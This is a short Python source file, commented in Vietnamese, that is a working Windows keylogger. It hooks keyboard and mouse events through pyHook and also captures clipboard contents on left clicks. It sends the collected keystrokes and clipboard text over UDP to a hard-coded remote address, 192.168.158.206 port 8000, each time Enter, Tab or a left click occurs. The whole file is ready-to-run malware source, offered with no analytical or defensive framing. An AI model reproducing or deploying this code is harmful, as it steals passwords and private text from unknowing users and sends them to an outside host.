'''
v1.0
'''
import pythoncom, pyHook
import socket
import win32clipboard
# v Theo doi key press
# x Theo doi shift key
# v Chuot trai, phai thi enter
# v Theo doi ctrl + c, lay du lieu trong bo nho tam (cu co bo nho tam la lay)
# x lay url dang chay

buffer=''
previous_clipboard=''

def get_clipboard():
	win32clipboard.OpenClipboard()
	try:
		data = win32clipboard.GetClipboardData()
	except:
		return '------ /!\\ GET CLIPBOARD ERROR! /!\\'
	win32clipboard.CloseClipboard()
	return data
	
def OnKeyboardEvent(event):
	#print 'Key:', event.Key
	#print event.Key+' '+str(event.KeyID)
	
	global buffer
	normal_key = range(48,58)+range(65,91)
	other_key = range(96,106)+range(186,193)+range(219,223)+range(8,9)+range(231,232)
	list_other_key = {	8:'< ', 96	:'0', 97:'1', 98:'2',99	:'3',100:'4',101:'5',102:'6',103:'7',104:'8',105:'9',
					186 :' ;: ',191 :' /? ',192 :' `~ ',219 :' [{ ',220 :' \| ',221 :' ]} ',222 :' single-quote/double-quote ',
					187 :' =+ ',188 :' ,< ',189 :' -_ ',190 :' .> ', 231 : ''  }

	if event.KeyID==13 or event.KeyID==9:
		client.sendto(buffer, ('192.168.158.206',8000))
		buffer=''
	elif event.KeyID in normal_key:
		#print event.Key,
		buffer+=event.Key
	elif event.KeyID==32:
		buffer+=' '
	elif event.KeyID in other_key:
		#print list_other_key[event.KeyID],
		buffer+=list_other_key[event.KeyID]
	else:
		#print ' ['+event.Key+'] ',
		buffer+=' ['+event.Key+'] '

	return True

def OnMouseEvent(event):
    #print 'MessageName:',event.MessageName
    #print 'Message:',event.Message
	'''
    if event.Message==513:
    	print ' [Left Click] '
    if event.Message==516:
    	print ' [Right Click] '
	'''
	global buffer, previous_clipboard
	if event.Message==513:
		clipboard=get_clipboard()
		if clipboard != '' and clipboard!=previous_clipboard: 
			buffer+=' [ Clipboard: %s]'%(clipboard)
			previous_clipboard=clipboard
		
		if buffer!='':
			client.sendto(buffer, ('192.168.158.206',8000))
			buffer=''
	return True

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.MouseAll = OnMouseEvent
hm.HookKeyboard()
hm.HookMouse()
pythoncom.PumpMessages()

